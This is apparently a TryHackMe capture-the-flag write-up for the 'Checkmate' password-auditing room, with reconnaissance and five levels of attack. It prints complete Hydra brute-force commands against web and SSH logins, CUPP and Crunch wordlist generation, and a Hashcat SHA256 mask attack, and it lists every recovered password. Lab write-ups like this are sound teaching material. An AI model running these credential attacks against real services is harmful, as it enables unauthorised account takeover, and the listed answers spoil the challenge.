#  Checkmate

> **Platform:** TryHackMe  
> **Difficulty:** Easy  
> **Category:** Web / OSINT / Password Attacks / SSH Brute-Force  
> **Date Completed:** 2026-05-18  
> **Room Link:** [https://tryhackme.com/room/checkmate](https://tryhackme.com/room/checkmate)

---

##  Table of Contents

1. [Room Overview](#room-overview)
2. [Reconnaissance](#reconnaissance)
3. [Level 1 — Default Credentials](#level-1--default-credentials)
4. [Level 2 — Company Keyword Password](#level-2--company-keyword-password)
5. [Level 3 — OSINT-Based Password (CUPP + Hydra)](#level-3--osint-based-password-cupp--hydra)
6. [Level 4 — SHA256 Hash Cracking](#level-4--sha256-hash-cracking)
7. [Level 5 — Pattern-Based SSH Brute-Force](#level-5--pattern-based-ssh-brute-force)
8. [Flags / Passwords](#flags--passwords)
9. [Key Takeaways](#key-takeaways)

---

##  Room Overview

Checkmate is a multi-stage password auditing challenge themed around a security assessment of an employee named **Marco Bianchi**. Each of the five levels targets a different real-world weakness in password usage — default credentials, company keywords, personal OSINT, SHA256 filename hashing, and predictable password patterns. All five passwords are submitted to the main application at port 5000.

**Goal:**  
Progress through all five levels by exploiting progressively sophisticated password weaknesses and submit each discovered password to the main app.

**Skills Practiced:**  
Default credential testing, company keyword guessing, CUPP + Hydra OSINT-based attacks, SHA256 hash cracking with Hashcat, Crunch wordlist generation, SSH brute-forcing with Hydra.

---

##  Reconnaissance

### Network Scanning

**Open ports discovered:**

| Port | Service / App |
|------|--------------|
| 22   | SSH |
| 5000 | Main challenge application |
| 5001 | `firewall.thm` — Firewall admin panel |
| 5002 | `jobs.thm` — Employee login portal |
| 5003 | `social.thm` — Marco's social profile |

### Adding subdomains to `/etc/hosts`

```bash
echo "10.49.181.213 firewall.thm" | sudo tee -a /etc/hosts
echo "10.49.181.213 jobs.thm"     | sudo tee -a /etc/hosts
echo "10.49.181.213 social.thm"   | sudo tee -a /etc/hosts
```

The main application at `http://10.49.181.213:5000` provides level-by-level guidance and accepts each discovered password as input.

---

##  Level 1 — Default Credentials

**Target:** `http://firewall.thm:5001`

> "Marco deployed a firewall but kept default credentials."

The login page accepts standard credentials. Testing common defaults:

```
admin:admin     
admin:root      
admin:password  
admin:12345     
```

**Password: `12345`**

---

##  Level 2 — Company Keyword Password

**Target:** `http://jobs.thm:5002`

> "Marco used common company keywords as passwords."

The employee login portal at `jobs.thm` presents company branding and content. Keywords visible on the site and in the level 1 dashboard are used as candidates:

```
marco:innovation  
marco:digital     
marco:cloud       
marco:excellence  
```

**Password: `excellence`**

---

##  Level 3 — OSINT-Based Password (CUPP + Hydra)

**Target:** `http://social.thm:5003`

> "Navigate to social.thm:5003 and derive Marco's password from personal info."

Using personal information gathered from the jobs portal and social profile, **CUPP** (Common User Passwords Profiler) generates a targeted wordlist based on Marco's details:

```bash
cupp -i
# Enter Marco's personal info: name, surname, birth year, etc.
```

**Hydra** brute-forces the social login using the CUPP-generated wordlist:

```bash
hydra -l marco -P cupp_output.txt social.thm http-post-form \
  "/login:username=^USER^&password=^PASS^:Invalid"
```

**Credentials found: `marco:Bianchi2495`**

**Password: `Bianchi2495`**

---

##  Level 4 — SHA256 Hash Cracking

**Target:** `http://social.thm:5003` — Marco's profile picture

> "The platform renames uploaded files to the SHA256 hash of the original filename. Identify the original filename."

**Hash presented:**
```
d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b
```

This is a **SHA256 hash of the original filename** (not of the file contents). Since the hash space of short common words is manageable, Hashcat is used with a mask targeting short lowercase words:

```bash
hashcat -a 3 -m 1400 d34a569ab7aaa54dacd715ae64953455d86b768846cd0085ef4e9e7471489b7b \
  ?l?l?l?l?l?l
```

**Hash cracked: `family`**

The original filename was `family.png` — the SHA256 of `family` matches the displayed hash.

**Password: `family`**

---

##  Level 5 — Pattern-Based SSH Brute-Force

**Target:** SSH on port 22 — username `marco`

Marco posted the following tip on his social profile:

> *"My tip for a strong password: I take a company keyword, capitalize it, then append the year like 2024 or any other number and an exclamation mark."*

Known company keywords from level 2: `security`, `excellence`, `innovation`, `digital`, `cloud`

**Step 1 — Generate a targeted wordlist with Crunch**

```bash
crunch 1 1 -p Security Excellence Innovation Digital Cloud \
  | awk '{for(y=2020;y<=2025;y++) print $0y"!"}' > wordlist.txt
```

Or manually build likely candidates:
```
Security2024!
Excellence2024!
Innovation2024!
Digital2024!
Cloud2024!
...
```

**Step 2 — Brute-force SSH with Hydra**

```bash
hydra -l marco -P wordlist.txt ssh://10.49.181.213
```

**SSH credentials found: `marco:Security2024!`**

**Password: `Security2024!`**

---

##  Flags / Passwords

| Level | Target | Technique | Password |
|-------|--------|-----------|----------|
| 1 | `firewall.thm:5001` | Default credentials | `12345` |
| 2 | `jobs.thm:5002` | Company keyword guessing | `excellence` |
| 3 | `social.thm:5003` | CUPP + Hydra OSINT attack | `Bianchi2495` |
| 4 | `social.thm:5003` (profile pic) | SHA256 hash cracking | `family` |
| 5 | SSH port 22 | Pattern wordlist + Hydra | `Security2024!` |

---

##  Key Takeaways

- **Default credentials are still rampant.** `admin:12345` on a firewall is a critical real-world risk. All network appliances must have their defaults changed before deployment.
- **Company branding leaks password candidates.** Marketing keywords (`excellence`, `innovation`, `cloud`) displayed on a company site are immediately useful for targeted attacks. Employees frequently use words they see every day.
- **OSINT tools like CUPP dramatically improve brute-force efficiency.** A generic rockyou.txt attack would take far longer than a targeted list built from a person's name, surname, and birth year.
- **Hashing a filename doesn't hide it.** SHA256 of short predictable strings (like `family`) can be cracked in seconds with a mask attack. Content-addressable storage should use random salts or UUIDs, not deterministic hashes of user-supplied names.
- **Publicly shared password patterns are a direct attack vector.** Marco's social post describing his exact password formula (`Keyword + Year + !`) reduced the brute-force search space to a handful of candidates. Never share your password construction logic — even in a vague way.
- **Crunch + Hydra = powerful targeted SSH attacks.** When a pattern is known, generating a small, precise wordlist and feeding it to Hydra is far more effective than generic dictionary attacks.

---

##  Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port discovery |
| Browser | Manual credential testing on levels 1 & 2 |
| CUPP | Generating OSINT-based wordlist for level 3 |
| Hydra | Brute-forcing levels 3 & 5 (web + SSH) |
| Hashcat (`-m 1400`, mask attack) | SHA256 hash cracking for level 4 |
| Crunch | Pattern-based wordlist generation for level 5 |

---

##  References

- [CUPP — Common User Passwords Profiler](https://github.com/Mebus/cupp)
- [Hashcat — SHA256 Mode 1400](https://hashcat.net/wiki/doku.php?id=hashcat)
- [Crunch Wordlist Generator](https://tools.kali.org/password-attacks/crunch)
- [HackTricks — Password Attacks](https://book.hacktricks.xyz/generic-methodologies-and-resources/brute-force)

---

*Writeup by Avaneesh*
